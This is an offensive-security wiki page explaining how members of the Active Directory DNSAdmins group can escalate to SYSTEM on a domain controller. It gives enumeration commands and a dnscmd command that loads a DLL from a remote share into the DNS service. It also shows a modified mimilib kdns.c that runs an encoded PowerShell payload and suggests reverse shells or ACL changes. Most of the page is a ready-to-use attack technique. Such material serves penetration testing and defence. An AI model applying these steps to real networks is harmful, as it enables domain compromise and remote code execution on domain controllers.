---
description: DNSAdmins
---

# DNSAdmins

> Consists of abusing privileges of the DNSAdmins group.

If we have the membership of the DNSAdmins group, that group has the capability to load an arbitrary DLL with the privileges of dns.exe (DNS service that runs with system level privileges).

If the DC is also being used as DNS (very common), we can run a DLL with system privileges on the DC, which means domain admin privs.

**Note:** DNSAdmins group should have the capability to restart the DNS service, which is not the default case but many times applied manually.

***

### 1. Enumerate members of the DNSAdmins group

```bash
#PowerView:
Get-NetGroupMember -GroupName "DNSAdmins"

#ADModule:
Get-ADGroupMember -Identity "DNSAdmins"
```

### 2. Compromise the user account of a member of DNSAdmins group

### 3. Configure DLL using dnscmd (needs RSAT DNS)

```bash
dnscmd $DC_HOSTNAME /config /serverlevelplugindll \\$IPADDRESS\dll\mimilib.dll
#Make sure that the dll directory is readable by everyone.
```

The above command will create a new registry key inside "Computer\HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters" with name "serverlevelplugindll" that contains the remote address of the DLL.

The default payload from mimilib.dll is to log all DNS queries at C:\Windows\System32\kiwidns.log inside the DC. We can change it to something more lethal (reverse shell, ACL modification, etc..):

```bash
#Inside the kdns.c function:
.
.
.
#pragma warning (pop)
{
  klog(kdns_logfile, L%S (%hu)\n, pszQueryName, wQueryType);
  fclose(kdns_logfile);
  system("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -e $ENCODEDPAYLOAD"); #MODIFY THIS
}
.
.
.
```

**Note:** If the payload is a reverse shell (syncronous), it will make all the DNS queries to fail, beucase the DNS service is busy executing the reverse shell.
